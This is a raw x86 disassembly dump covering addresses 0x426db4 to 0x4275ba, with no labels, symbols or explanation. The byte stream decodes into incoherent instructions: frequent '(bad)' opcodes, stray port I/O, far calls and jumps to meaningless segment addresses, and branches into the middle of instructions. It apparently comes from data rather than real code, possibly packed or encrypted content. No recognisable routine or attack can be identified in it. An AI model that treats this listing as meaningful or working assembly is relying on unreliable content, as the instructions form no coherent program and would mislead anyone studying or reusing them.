  426db4:	mov    ah,0xf5
  426db6:	test   DWORD PTR [ecx+ecx*2+0x6568e29f],ebx
  426dbd:	sub    DWORD PTR [edi],esi
  426dbf:	test   DWORD PTR [ebp*2-0x76d5429],edx
  426dc6:	mov    ah,0xe6
  426dc8:	sub    al,0x87
  426dca:	adc    esi,edx
  426dcc:	retf   0xc8c6
  426dcf:	dec    ebx
  426dd0:	mov    bh,BYTE PTR [esi+0xf]
  426dd3:	pop    ecx
  426dd4:	jle    0x426dc1
  426dd6:	out    dx,al
  426dd7:	gs es fs inc ecx
  426ddb:	leave  
  426ddc:	xor    BYTE PTR [ebp-0x67e4f9cd],dh
  426de2:	dec    esp
  426de3:	out    dx,al
  426de4:	xor    ecx,DWORD PTR [ecx]
  426de6:	(bad)  
  426de7:	sbb    bh,BYTE PTR [edx-0x4a]
  426dea:	(bad)  
  426deb:	ins    DWORD PTR es:[edi],dx
  426dec:	in     eax,0x6c
  426dee:	jns    0x426dae
  426df0:	push   0xffffffff
  426df2:	fst    DWORD PTR ds:0x7cc07b39
  426df8:	and    ah,ch
  426dfa:	mov    bh,0xd9
  426dfc:	sub    al,BYTE PTR [ecx]
  426dfe:	sbb    eax,DWORD PTR [eax-0x16]
  426e01:	adc    edx,ebx
  426e03:	mov    eax,0x970a7e42
  426e08:	cmp    BYTE PTR [esi+edi*1+0xa4a6],bl
	...
  426e17:	add    BYTE PTR [eax],al
  426e19:	add    BYTE PTR [esi-0x28ab281c],dh
  426e1f:	ja     0x426dd8
  426e21:	out    0x39,al
  426e23:	(bad)  
  426e24:	push   ebx
  426e25:	lahf   
  426e26:	adc    eax,0x1311ad77
  426e2b:	in     al,0x1
  426e2d:	add    bl,bh
  426e2f:	add    DWORD PTR [eax],eax
  426e31:	add    BYTE PTR [eax-0xb],dl
  426e34:	inc    edi
  426e35:	icebp  
  426e36:	stos   DWORD PTR es:[edi],eax
  426e37:	sub    edi,edx
  426e39:	sbb    DWORD PTR [edi-0x61264cad],ebp
  426e3f:	mov    dh,0xa0
  426e41:	sbb    eax,0xe99afcdc
  426e46:	xor    DWORD PTR [ebp+0x78],eax
  426e49:	out    dx,eax
  426e4a:	inc    ebp
  426e4b:	xor    al,0x14
  426e4d:	jecxz  0x426e4d
  426e4f:	nop
  426e50:	dec    esi
  426e51:	push   eax
  426e52:	std    
  426e53:	fistp  QWORD PTR [ebp-0x36]
  426e56:	mov    ds:0xf5b334d9,eax
  426e5b:	cmp    BYTE PTR [ecx-0x7902a374],bl
  426e61:	mov    edi,0x920a2a4
  426e66:	(bad)  
  426e67:	popa   
  426e68:	sub    bl,BYTE PTR [edx-0x37]
  426e6b:	ds inc ebp
  426e6d:	ja     0x426eec
  426e6f:	push   cs
  426e70:	xchg   ebp,eax
  426e71:	adc    bh,bh
  426e73:	pop    es
  426e74:	ror    DWORD PTR [esi+0x3d],cl
  426e77:	mov    al,0x8a
  426e79:	popf   
  426e7a:	push   ds
  426e7b:	mov    ah,0xa7
  426e7d:	inc    ebp
  426e7e:	xor    al,0x48
  426e80:	mov    ds:0x1ceecc3a,al
  426e85:	xchg   edx,eax
  426e86:	sbb    esi,DWORD PTR [eax+0x73605812]
  426e8c:	add    edx,DWORD PTR [esi]
  426e8e:	cli    
  426e8f:	lea    ecx,[ecx+eiz*2-0x1bbfaf55]
  426e96:	add    esp,DWORD PTR ss:[edx+0xd]
  426e9a:	call   0xe862:0x8e2e3128
  426ea1:	push   0x5cf71a6d
  426ea6:	into   
  426ea7:	mov    ds:0x88e02c6c,al
  426eac:	popa   
  426ead:	cmp    BYTE PTR [edi-0x425dbc0d],cl
  426eb3:	icebp  
  426eb4:	xchg   esp,eax
  426eb5:	mov    ebx,0xe6341c2e
  426eba:	sar    DWORD PTR [ebp-0x51e1ecc0],cl
  426ec0:	cmp    al,0x97
  426ec2:	ror    ah,1
  426ec4:	div    BYTE PTR [ebx+0x2e0e8ee4]
  426eca:	les    ebp,FWORD PTR [ebx-0x2180af10]
  426ed0:	inc    ebx
  426ed1:	lea    ebx,[eax]
  426ed3:	dec    edi
  426ed4:	(bad)  
  426ed5:	or     esp,DWORD PTR [edx-0x7]
  426ed8:	jnp    0x426ece
  426eda:	addr16 and ebx,ecx
  426edd:	ins    BYTE PTR es:[edi],dx
  426ede:	xor    DWORD PTR [esi+0x73],esp
  426ee1:	out    0x1,eax
  426ee3:	out    dx,eax
  426ee4:	pop    edi
  426ee5:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426ee7:	outs   dx,DWORD PTR fs:[esi]
  426ee9:	fstp   DWORD PTR [ecx+0x7d2222ae]
  426eef:	repz or cl,BYTE PTR [ecx]
  426ef2:	clc    
  426ef3:	(bad)  
  426ef4:	push   esp
  426ef5:	push   ss
  426ef6:	fcmove st,st(1)
  426ef9:	into   
  426efa:	inc    esp
  426efb:	dec    edi
  426efc:	popa   
  426efd:	cld    
  426efe:	and    eax,0xb768b137
  426f03:	and    al,0x99
  426f05:	dec    ecx
  426f06:	(bad)  [eax-0x1b70aead]
  426f0c:	or     eax,0x811f9a63
  426f11:	jae    0x426f15
  426f13:	mov    cl,0x9
  426f15:	xchg   ebp,eax
  426f16:	mov    BYTE PTR [edi+0x415059c5],bh
  426f1c:	mov    al,ds:0xa132aea5
  426f21:	mov    dh,0x22
  426f23:	lods   eax,DWORD PTR ds:[esi]
  426f24:	repz in eax,0x90
  426f27:	(bad)  
  426f28:	(bad)  
  426f29:	in     al,dx
  426f2a:	add    cl,BYTE PTR [ebx+0x774518c0]
  426f30:	scas   al,BYTE PTR es:[edi]
  426f31:	add    dl,BYTE PTR [eax+ebp*2+0x2b]
  426f35:	or     edx,DWORD PTR [edi]
  426f37:	aam    0xf6
  426f39:	add    al,0xbe
  426f3b:	out    dx,eax
  426f3c:	test   DWORD PTR [edx+ecx*2+0x55fcf597],0x590f9c68
  426f47:	ficomp WORD PTR [ebp-0x5d]
  426f4a:	mov    ?,WORD PTR [edx]
  426f4c:	cmp    BYTE PTR [ecx],bh
  426f4e:	pop    ecx
  426f4f:	js     0x426f67
  426f51:	lock and esp,0x48
  426f55:	clc    
  426f56:	jne    0x426efd
  426f58:	add    BYTE PTR [ecx+edx*2],dl
  426f5b:	enter  0x137,0xf3
  426f5f:	and    eax,0x293b438
  426f64:	xor    DWORD PTR [ebx+0x1d],ebp
  426f67:	pop    eax
  426f68:	fucomip st,st(4)
  426f6a:	xchg   edi,eax
  426f6b:	jae    0x426fcc
  426f6d:	test   ah,ch
  426f6f:	stc    
  426f70:	and    ecx,eax
  426f72:	(bad)  
  426f73:	push   es
  426f74:	out    dx,eax
  426f75:	(bad)  
  426f76:	call   0x5e7e3ee0
  426f7b:	lahf   
  426f7c:	mov    edx,0x4992108a
  426f81:	push   eax
  426f82:	repz inc ecx
  426f84:	dec    eax
  426f85:	mov    ch,0xa
  426f87:	mov    BYTE PTR [ecx+0x5b],bl
  426f8a:	jbe    0x426f6f
  426f8c:	add    ch,BYTE PTR [ecx-0x5c]
  426f8f:	sbb    BYTE PTR [edi-0x39e23b97],0x45
  426f96:	int3   
  426f97:	or     eax,0xef96d8ef
  426f9c:	out    0x46,al
  426f9e:	xchg   edi,eax
  426f9f:	mov    WORD PTR [ecx-0x3c354730],gs
  426fa5:	jns    0x426f72
  426fa7:	xchg   edx,eax
  426fa8:	cli    
  426fa9:	xor    dl,BYTE PTR [edi]
  426fab:	or     esp,DWORD PTR [ebx-0x3a2153e1]
  426fb1:	fwait
  426fb2:	adc    eax,0xd68d0f51
  426fb7:	arpl   sp,si
  426fb9:	mov    ah,al
  426fbb:	jae    0x426f6f
  426fbd:	adc    eax,0x6428722e
  426fc2:	xor    BYTE PTR [edx+0x5000c38e],bh
  426fc8:	push   edi
  426fc9:	scas   al,BYTE PTR es:[edi]
  426fca:	sbb    edx,DWORD PTR [edx+ebx*2]
  426fcd:	test   BYTE PTR [esi],cl
  426fcf:	sub    al,bl
  426fd1:	popf   
  426fd2:	push   0x22
  426fd4:	cmp    edi,eax
  426fd6:	(bad)  
  426fd7:	cmp    al,0xef
  426fd9:	sub    DWORD PTR [ecx-0x28],ecx
  426fdc:	adc    al,0xf4
  426fde:	inc    esp
  426fdf:	cmc    
  426fe0:	jns    0x426f80
  426fe2:	sub    al,0xa5
  426fe4:	cmp    bh,BYTE PTR [edi]
  426fe6:	jl     0x427054
  426fe8:	retf   
  426fe9:	js     0x426ff5
  426feb:	lock stos DWORD PTR es:[edi],eax
  426fed:	cwde   
  426fee:	(bad)  
  426fef:	into   
  426ff0:	push   esp
  426ff1:	cmp    BYTE PTR ds:0xf6e4f709,0x77
  426ff8:	mov    edi,0x82de6c4a
  426ffd:	in     al,0x86
  426fff:	pop    esi
  427000:	ficom  DWORD PTR [ebp-0x31]
  427003:	jp     0x426fc2
  427005:	ins    DWORD PTR es:[edi],dx
  427006:	neg    BYTE PTR [eax+0x18b50909]
  42700c:	and    bl,dh
  42700e:	push   ebp
  42700f:	mov    ebx,0x69b72e83
  427014:	imul   esp
  427016:	clc    
  427017:	mov    ebx,0x69b5606b
  42701c:	jecxz  0x427001
  42701e:	test   eax,0xda3ba79f
  427023:	stc    
  427024:	das    
  427025:	mov    bh,0x4e
  427027:	fcmovnu st,st(5)
  427029:	ret    0x4717
  42702c:	xor    eax,DWORD PTR [eax]
	...
  42703a:	cli    
  42703b:	rcl    DWORD PTR ds:0xfac73d07,cl
  427041:	jmp    DWORD PTR [ecx-0xf5bc2eb]
  427047:	pop    ss
  427048:	or     ch,BYTE PTR [ecx+0x1e60e]
  42704e:	sti    
  42704f:	add    DWORD PTR [eax],eax
  427051:	add    BYTE PTR [edx],bh
  427053:	add    DWORD PTR [esi],ecx
  427055:	les    ebp,FWORD PTR [edi+0x5]
  427058:	inc    ebp
  427059:	jmp    0x1374:0xb0d000a2
  427060:	mov    bh,0xbf
  427062:	daa    
  427063:	mov    ecx,ebx
  427065:	adc    bl,dh
  427067:	inc    BYTE PTR [ecx+0x1be1ab64]
  42706d:	(bad)  
  42706e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42706f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427070:	mov    ecx,0x229939ce
  427075:	je     0x427016
  427077:	sbb    al,0x59
  427079:	and    DWORD PTR [eax+ebx*8+0x3b],esp
  42707d:	jp     0x42702d
  42707f:	push   ebx
  427080:	mov    fs,ecx
  427082:	xchg   ebp,eax
  427083:	outs   dx,DWORD PTR ds:[esi]
  427084:	xchg   edi,eax
  427085:	mov    dl,dh
  427087:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427088:	aam    0x27
  42708a:	push   ebx
  42708b:	cli    
  42708c:	and    al,0xea
  42708e:	or     eax,0xde62219a
  427093:	pushf  
  427094:	scas   al,BYTE PTR es:[edi]
  427095:	ret    
  427096:	inc    ebp
  427097:	xor    al,0x2f
  427099:	and    edi,eax
  42709b:	adc    DWORD PTR [esi-0x16],eax
  42709e:	shl    dl,0x99
  4270a1:	cmp    eax,0xb75ad1c0
  4270a6:	mov    esp,0x84dcb146
  4270ab:	jl     0x4270dd
  4270ad:	out    0x10,al
  4270af:	push   ebp
  4270b0:	rol    DWORD PTR [edi],1
  4270b2:	sub    esi,DWORD PTR [edx+eax*1]
  4270b5:	xchg   edi,eax
  4270b6:	out    0xac,eax
  4270b8:	adc    cl,BYTE PTR [eax+0x7169d7d]
  4270be:	lahf   
  4270bf:	push   eax
  4270c0:	mov    eax,ds:0x4546b6c5
  4270c5:	psrlq  mm1,mm0
  4270c8:	jo     0x4270f1
  4270ca:	(bad)  
  4270cb:	div    DWORD PTR [eax]
  4270cd:	loop   0x42706d
  4270cf:	lea    ebp,[ebx+0x5eeb4da8]
  4270d5:	adc    DWORD PTR [edi+0x0],ecx
  4270d8:	aad    0x6a
  4270da:	sahf   
  4270db:	and    eax,0xb565a884
  4270e0:	xchg   esi,eax
  4270e1:	xchg   ecx,eax
  4270e2:	add    al,0xe0
  4270e4:	aaa    
  4270e5:	dec    eax
  4270e6:	retf   
  4270e7:	and    DWORD PTR [ebx+0x15],edi
  4270ea:	int3   
  4270eb:	in     eax,dx
  4270ec:	mov    dl,0xb
  4270ee:	sbb    al,0xa8
  4270f0:	call   0xcc0d:0x6e5e164b
  4270f7:	fcom   st(0)
  4270f9:	fdiv   DWORD PTR [ebp+0x65bb6cee]
  4270ff:	(bad)  
  427100:	loopne 0x4270ef
  427102:	xchg   ebx,edi
  427104:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427105:	rol    DWORD PTR [ebx+eiz*8],0x51
  427109:	pop    esp
  42710a:	fwait
  42710b:	xchg   edi,eax
  42710c:	or     BYTE PTR [ebx],bl
  42710e:	mov    esi,0x2d8d1086
  427113:	or     DWORD PTR [ebx-0x2d],0x8
  427117:	mov    BYTE PTR [eax-0x28],ah
  42711a:	xchg   esi,eax
  42711b:	repz ja 0x427136
  42711e:	mov    al,0x13
  427120:	push   0x57236332
  427125:	call   0x28a8dd29
  42712a:	icebp  
  42712b:	sbb    eax,DWORD PTR [eax+0x4310a4c4]
  427131:	(bad)  
  427132:	int    0x99
  427134:	xchg   esp,eax
  427135:	adc    bl,cl
  427137:	mov    ebx,0x63a09446
  42713c:	sahf   
  42713d:	mov    esi,DWORD PTR [edx+eiz*4-0x2625bc55]
  427144:	dec    ebx
  427145:	popf   
  427146:	popf   
  427147:	push   esi
  427148:	inc    ecx
  427149:	xor    al,0xf1
  42714b:	addr16 (bad) 
  42714d:	out    dx,eax
  42714e:	repnz stos BYTE PTR es:[edi],al
  427150:	or     al,0xa1
  427152:	and    edx,DWORD PTR [ecx-0x60]
  427155:	std    
  427156:	in     eax,dx
  427157:	or     dl,cl
  427159:	aad    0x29
  42715b:	mov    al,ds:0x38ee4046
  427160:	mov    esi,0xd17723f8
  427165:	push   ecx
  427166:	inc    ebp
  427167:	sbb    BYTE PTR ds:0xb563cc00,al
  42716d:	inc    ebp
  42716e:	js     0x427189
  427170:	sub    DWORD PTR [ecx],0x81bbeb4a
  427176:	mov    dh,0xa0
  427178:	daa    
  427179:	call   0xbc33:0x26416aa9
  427180:	pop    ebp
  427181:	mov    DWORD PTR [edi],edi
  427183:	shl    DWORD PTR [esi],0x1a
  427186:	shl    DWORD PTR [ecx+0x1b3020d4],1
  42718c:	jecxz  0x4271f2
  42718e:	mov    BYTE PTR [edi+0x41],bh
  427191:	imul   ebp,esi,0x8792876
  427197:	sub    eax,DWORD PTR [ebp+0x5f]
  42719a:	call   0x606cae5f
  42719f:	cld    
  4271a0:	call   0x36f28271
  4271a5:	xchg   esp,eax
  4271a6:	xchg   esi,eax
  4271a7:	es and eax,0x2357f826
  4271ad:	mov    DWORD PTR [edi+ebx*8+0x4a],ebx
  4271b1:	or     DWORD PTR [ebx],eax
  4271b3:	pushf  
  4271b4:	imul   edi,DWORD PTR [edx],0x3891ff13
  4271ba:	sahf   
  4271bb:	inc    edi
  4271bc:	adc    DWORD PTR [eax],ebp
  4271be:	xchg   ecx,eax
  4271bf:	xor    DWORD PTR [edi-0x482d08b2],edi
  4271c5:	sub    bl,al
  4271c7:	aaa    
  4271c8:	leave  
  4271c9:	(bad)  
  4271cb:	or     ah,BYTE PTR [edx-0x9]
  4271ce:	ja     0x427154
  4271d0:	cmp    eax,0x23c0a946
  4271d5:	test   al,0xfa
  4271d7:	outs   dx,DWORD PTR ds:[esi]
  4271d8:	imul   edi,DWORD PTR [ecx],0xfffffff5
  4271db:	es mov eax,0x1a946e2e
  4271e1:	or     bh,BYTE PTR [edx+0x57ad6456]
  4271e7:	mov    eax,ds:0xb2b47e15
  4271ec:	xor    al,0xa0
  4271ee:	lea    ebp,[eax+0x6e]
  4271f1:	popf   
  4271f2:	mov    dl,0xf4
  4271f4:	ins    DWORD PTR es:[edi],dx
  4271f5:	out    dx,al
  4271f6:	xor    DWORD PTR ds:0x46d0cc8f,edi
  4271fc:	or     al,0xa0
  4271fe:	retf   0x814a
  427201:	outs   dx,BYTE PTR ds:[esi]
  427202:	cs jne 0x427201
  427205:	cmp    esi,DWORD PTR [edi-0x3d001846]
  42720b:	sbb    dh,BYTE PTR [ecx]
  42720d:	mov    bh,0x38
  42720f:	inc    DWORD PTR [eax-0x283b7dbf]
  427215:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427216:	push   esi
  427217:	sub    al,0x62
  427219:	bound  eax,QWORD PTR [edi]
  42721b:	cmp    dh,BYTE PTR [edx-0x44]
  42721e:	jnp    0x42723d
  427220:	inc    edx
  427221:	ror    BYTE PTR [edx+0x40cde13a],1
  427227:	pop    esi
  427228:	cli    
  427229:	loop   0x4271c6
  42722b:	(bad)  
  42722c:	mov    ch,0xe5
  42722e:	fs retf 
  427230:	loope  0x427260
  427232:	int    0xca
  427234:	xor    eax,0x2ba718c8
  427239:	fs pushf 
  42723b:	inc    edi
  42723c:	js     0x427220
  42723e:	add    al,0x4d
  427240:	dec    esi
  427241:	add    al,0xf3
  427243:	stos   DWORD PTR es:[edi],eax
  427244:	sub    al,0x83
  427246:	(bad)  
  427247:	ins    BYTE PTR es:[edi],dx
  427248:	ds popa 
  42724a:	add    BYTE PTR [esi+0x64],al
	...
  427259:	add    bh,cl
  42725b:	neg    BYTE PTR [ebp-0x308442b0]
  427261:	(bad)  
  427262:	mov    ecx,0x98b02077
  427267:	cmp    ch,bl
  427269:	je     0x427274
  42726b:	call   0x23d7271
  427270:	add    BYTE PTR [eax],al
  427272:	das    
  427273:	pop    eax
  427274:	inc    ebp
  427275:	mov    ds:0x1fd06693,eax
  42727a:	cs or  al,cl
  42727d:	inc    eax
  42727e:	push   ecx
  42727f:	mov    edx,DWORD PTR [ecx-0x68f79517]
  427285:	test   eax,0x7a839d29
  42728a:	cmp    al,0x24
  42728c:	out    dx,al
  42728d:	jmp    0x9925:0xabf75a9c
  427294:	jns    0x427281
  427296:	ss mov ch,dl
  427299:	or     al,0x11
  42729b:	xor    al,0x2f
  42729d:	mov    dh,0xfa
  42729f:	stos   DWORD PTR es:[edi],eax
  4272a0:	sub    al,BYTE PTR [edi-0x66e08e14]
  4272a6:	jg     0x427257
  4272a8:	int3   
  4272a9:	movntq QWORD PTR [esi+0x21],mm4
  4272ad:	lods   eax,DWORD PTR ds:[esi]
  4272ae:	repnz sub DWORD PTR [edi],0xec445628
  4272b5:	pop    esi
  4272b6:	fsubr  st,st(2)
  4272b8:	rcr    ebp,0x71
  4272bb:	mov    ah,BYTE PTR [ecx+0xa]
  4272be:	mov    al,0xa2
  4272c0:	dec    esp
  4272c1:	sub    BYTE PTR [ebp+ecx*2+0x3bfd326a],0x23
  4272c9:	push   cs
  4272ca:	loope  0x42731d
  4272cc:	scas   eax,DWORD PTR es:[edi]
  4272cd:	xor    al,dh
  4272cf:	jecxz  0x427344
  4272d1:	dec    eax
  4272d2:	jae    0x4272e5
  4272d4:	in     al,0xc4
  4272d6:	ror    DWORD PTR [edi+0x63f9460e],0x6a
  4272dd:	cmp    eax,0xd2a98a
  4272e2:	rcl    bl,cl
  4272e4:	add    eax,DWORD PTR [ecx+0x38769c9e]
  4272ea:	lock jl 0x427272
  4272ed:	mov    WORD PTR [ebp+0x42],es
  4272f0:	jecxz  0x4272a1
  4272f2:	mov    gs,WORD PTR [edx-0x42]
  4272f5:	jmp    0x353cd616
  4272fa:	fsub   DWORD PTR [edi-0x6bf0d827]
  427300:	aas    
  427301:	les    ebx,FWORD PTR [ebp+0x41]
  427304:	int    0xc
  427306:	push   ecx
  427307:	aam    0xeb
  427309:	das    
  42730a:	out    dx,eax
  42730b:	cli    
  42730c:	xor    eax,0x13b2751f
  427311:	fidiv  DWORD PTR [edi+0x2977bb2b]
  427317:	outs   dx,DWORD PTR ds:[esi]
  427318:	imul   esp,DWORD PTR ds:0xbe9edd59,0x3513be9f
  427322:	nop
  427323:	cli    
  427324:	mov    esp,0xbf954836
  427329:	inc    edi
  42732a:	sti    
  42732b:	js     0x4272fe
  42732d:	mov    ebp,0x3fe2de87
  427332:	and    BYTE PTR [eax-0x2a],0x7d
  427336:	mov    esi,0xa7e36e3b
  42733b:	jne    0x427322
  42733d:	xchg   DWORD PTR [edx-0x70],esi
  427340:	sbb    bl,bl
  427342:	jns    0x42737f
  427344:	icebp  
  427345:	popa   
  427346:	jbe    0x427359
  427348:	stos   BYTE PTR es:[edi],al
  427349:	(bad)  
  42734c:	add    al,0x25
  42734e:	mov    al,ss:0x1501642b
  427354:	or     ebx,DWORD PTR [eax-0x1e9b2171]
  42735a:	jg     0x4272e8
  42735c:	xor    esi,esp
  42735e:	ret    
  42735f:	test   eax,0x1153fcde
  427364:	lds    ebp,FWORD PTR [esi+0x5f]
  427367:	fld    DWORD PTR [ecx-0x63e06432]
  42736d:	sbb    eax,0xb5259e14
  427372:	xor    DWORD PTR [eax-0x53],ebp
  427375:	dec    eax
  427376:	add    bl,BYTE PTR [eax+0x53]
  427379:	sbb    esp,ebp
  42737b:	sub    BYTE PTR [ecx],bh
  42737d:	arpl   sp,sp
  42737f:	jmp    0x4273c0
  427381:	and    BYTE PTR [edx+ebp*8-0x4bb70362],cl
  427388:	stos   DWORD PTR es:[edi],eax
  427389:	sti    
  42738a:	loopne 0x427386
  42738c:	mov    eax,ds:0xcd4e2869
  427391:	xchg   ecx,eax
  427392:	mov    ?,WORD PTR [esi-0x376093fc]
  427398:	out    0x65,al
  42739a:	pushfw 
  42739c:	in     al,dx
  42739d:	loop   0x42733e
  42739f:	fwait
  4273a0:	cmp    eax,0xfcdda97d
  4273a5:	repz gs fwait
  4273a8:	xchg   DWORD PTR [ebx+0x11],ecx
  4273ab:	bound  ebp,QWORD PTR [ebx-0x5d]
  4273ae:	int3   
  4273af:	mov    BYTE PTR [eax],dl
  4273b1:	lock clc 
  4273b3:	in     eax,dx
  4273b4:	xchg   esi,eax
  4273b5:	jle    0x4273be
  4273b7:	jo     0x427371
  4273b9:	xchg   esi,eax
  4273ba:	stos   DWORD PTR es:[edi],eax
  4273bb:	aad    0xb
  4273bd:	(bad)  
  4273be:	test   eax,0x334d7c03
  4273c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4273c4:	xchg   ebp,eax
  4273c5:	aas    
  4273c6:	adc    BYTE PTR [ebx-0x47],al
  4273c9:	mov    eax,0x6ba27a61
  4273ce:	daa    
  4273cf:	popa   
  4273d0:	push   ss
  4273d1:	push   edi
  4273d2:	(bad)  
  4273d4:	std    
  4273d5:	cmp    al,BYTE PTR [edx]
  4273d7:	mov    al,ds:0x95500dd1
  4273dc:	(bad)  
  4273dd:	test   DWORD PTR [esi+ebx*2-0x40],esp
  4273e1:	or     eax,0x7df5ba47
  4273e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4273e7:	sbb    al,ah
  4273e9:	call   DWORD PTR [eax+0x35]
  4273ec:	test   eax,0x4d2e918e
  4273f1:	jp     0x4273a3
  4273f3:	(bad)  [edx-0x111db434]
  4273f9:	jg     0x4273f3
  4273fb:	iret   
  4273fc:	aam    0x2f
  4273fe:	gs stos BYTE PTR es:[edi],al
  427400:	ja     0x427462
  427402:	dec    eax
  427403:	jb     0x427419
  427405:	sub    BYTE PTR [edi],dl
  427407:	inc    ebp
  427408:	jp     0x4273d1
  42740a:	fwait
  42740b:	js     0x427476
  42740d:	loope  0x4273b6
  42740f:	scas   al,BYTE PTR es:[edi]
  427410:	out    0x2d,al
  427412:	je     0x427491
  427414:	or     BYTE PTR [eax+0x73],al
  427417:	scas   al,BYTE PTR es:[edi]
  427418:	jl     0x427431
  42741a:	iret   
  42741b:	aaa    
  42741c:	mov    ecx,0x48d2884c
  427421:	loopne 0x427486
  427423:	push   eax
  427424:	imul   edi,ebp,0x9a3fe8af
  42742a:	sbb    cl,BYTE PTR [eax-0x61]
  42742d:	xchg   esp,eax
  42742e:	fwait
  42742f:	cwde   
  427430:	stos   BYTE PTR es:[edi],al
  427431:	mov    bl,0xac
  427433:	push   ebx
  427434:	mov    BYTE PTR [ebx-0x21],dl
  427437:	test   cl,bh
  427439:	jecxz  0x427434
  42743b:	mov    edx,0xba2aa25d
  427440:	sti    
  427441:	adc    bh,BYTE PTR [edx-0x2c3fe2f7]
  427447:	inc    ecx
  427448:	mov    eax,DWORD PTR [edi+ecx*2-0x2cd43b14]
  42744f:	sub    al,0x83
  427451:	ja     0x4273e7
  427453:	mov    dh,0xa3
  427455:	daa    
  427456:	(bad)  
  427458:	push   esp
  427459:	sub    edx,0xfffffff3
  42745c:	mov    bl,BYTE PTR [edi-0x24]
  42745f:	ror    al,1
  427461:	mov    ch,0xee
  427463:	inc    esi
  427464:	pop    ecx
  427465:	sbb    al,0x65
  427467:	pop    ds
  427468:	xchg   ebp,eax
  427469:	and    al,0x1a
  42746b:	sbb    al,0xa6
	...
  427479:	add    BYTE PTR [eax+0x23],ch
  42747c:	sub    eax,0x7b1e6f1e
  427481:	ja     0x4274f2
  427483:	jno    0x4274a3
  427485:	dec    esi
  427486:	outs   dx,DWORD PTR ds:[esi]
  427487:	push   esp
  427488:	push   ecx
  427489:	sahf   
  42748a:	add    al,0xea
  42748c:	add    DWORD PTR [eax],eax
  42748e:	sti    
  42748f:	add    DWORD PTR [eax],eax
  427491:	add    BYTE PTR [edi-0x66],cl
  427494:	bound  ebx,QWORD PTR [edi-0x4c]
  427497:	js     0x42748b
  427499:	icebp  
  42749a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42749b:	(bad)  
  42749c:	in     al,0xd6
  42749e:	(bad)  
  42749f:	or     BYTE PTR [ecx+ebp*2-0x4a],ch
  4274a3:	cs aas 
  4274a5:	xchg   ebx,eax
  4274a6:	(bad)  
  4274a7:	loop   0x4274f3
  4274a9:	mov    edi,0x7de62500
  4274ae:	call   0xe5af:0x7ef416e5
  4274b5:	inc    ecx
  4274b6:	jmp    0x329c:0x73332a1c
  4274bd:	or     dh,cl
  4274bf:	ja     0x4274ac
  4274c1:	sbb    BYTE PTR [eax],0x18
  4274c4:	stos   DWORD PTR es:[edi],eax
  4274c5:	mov    ds,WORD PTR ds:0xfa028020
  4274cb:	inc    ecx
  4274cc:	dec    ebp
  4274cd:	push   esi
  4274ce:	or     DWORD PTR [edx],ecx
  4274d0:	jno    0x427492
  4274d2:	jecxz  0x4274aa
  4274d4:	mov    bh,0x21
  4274d6:	cld    
  4274d7:	adc    eax,0xa5754ccb
  4274dc:	cld    
  4274dd:	sahf   
  4274de:	jbe    0x42750b
  4274e0:	out    dx,al
  4274e1:	fs sub al,0xb5
  4274e4:	mov    eax,ds:0xa1321cb6
  4274e9:	(bad)  
  4274ea:	and    ebp,eax
  4274ec:	mov    cl,0xff
  4274ee:	bound  esp,QWORD PTR [edi-0xeffe49c]
  4274f4:	cmp    DWORD PTR [edi],eax
  4274f6:	(bad)
  4274f9:	xor    eax,0xcb36257a
  4274fe:	xlat   BYTE PTR ds:[ebx]
  4274ff:	push   ebp
  427500:	and    eax,0xbc02fe5f
  427505:	lods   al,BYTE PTR ds:[esi]
  427506:	jcxz   0x42749e
  427509:	add    eax,0x67998f37
  42750e:	inc    esi
  42750f:	jle    0x42756a
  427511:	jae    0x4274fa
  427513:	dec    esp
  427514:	xor    edi,DWORD PTR [ecx+0x5d47aa5a]
  42751a:	pop    esi
  42751b:	arpl   WORD PTR [edx],bx
  42751d:	dec    eax
  42751e:	mov    eax,0x36d0a1b7
  427523:	adc    BYTE PTR [edx],0x7e
  427526:	imul   esp,ebx,0xae1c71bd
  42752c:	popa   
  42752d:	adc    DWORD PTR [edx-0x67],eax
  427530:	pop    esp
  427531:	lods   eax,DWORD PTR ds:[esi]
  427532:	add    bh,BYTE PTR [eax-0x516d0e45]
  427538:	sub    al,BYTE PTR [eax+ebx*1]
  42753b:	inc    eax
  42753c:	pop    esi
  42753d:	push   eax
  42753e:	adc    BYTE PTR [ecx],bh
  427540:	xor    BYTE PTR [eax],ch
  427542:	ret    
  427543:	inc    esi
  427544:	jae    0x42751b
  427546:	loopne 0x427584
  427548:	xchg   BYTE PTR [esi-0x4e0c6c3a],ch
  42754e:	stc    
  42754f:	sahf   
  427550:	clc    
  427551:	sbb    eax,DWORD PTR ds:0xff29ea37
  427557:	clc    
  427558:	fcom   QWORD PTR [ebp-0x7cc7215]
  42755e:	adc    DWORD PTR [edx],0x25
  427561:	adc    BYTE PTR [edi+0x277724f2],dh
  427567:	enter  0x2c51,0xb9
  42756b:	imul   ebx,DWORD PTR [esi+0x577f70fd],0x3850a52e
  427575:	mov    esi,DWORD PTR [ecx+0x75]
  427578:	(bad)  
  427579:	jae    0x4275bf
  42757b:	jo     0x4275f3
  42757d:	out    dx,al
  42757e:	jnp    0x4275ac
  427580:	push   esp
  427581:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427582:	cmc    
  427583:	jnp    0x4275ca
  427585:	outs   dx,BYTE PTR ss:[esi]
  427587:	jmp    0xfb23:0x3989191e
  42758e:	in     eax,dx
  42758f:	mul    BYTE PTR [edi+0x1]
  427592:	arpl   WORD PTR [edi-0xc],bx
  427595:	stos   DWORD PTR es:[edi],eax
  427596:	mov    dh,0x89
  427598:	sar    dl,1
  42759a:	sub    eax,0xe240f8e0
  42759f:	dec    DWORD PTR [ebp-0x71]
  4275a2:	mov    cl,0x23
  4275a4:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4275a6:	jl     0x427615
  4275a8:	fisttp DWORD PTR [edx+ecx*2+0xdaaa326]
  4275af:	test   BYTE PTR [edi+0x52],dl
  4275b2:	lock mov eax,ds:0x7f73a62e
  4275b8:	cmp    dh,bl
  4275ba:	or     BYTE PTR [eax+0x3b911c13],al
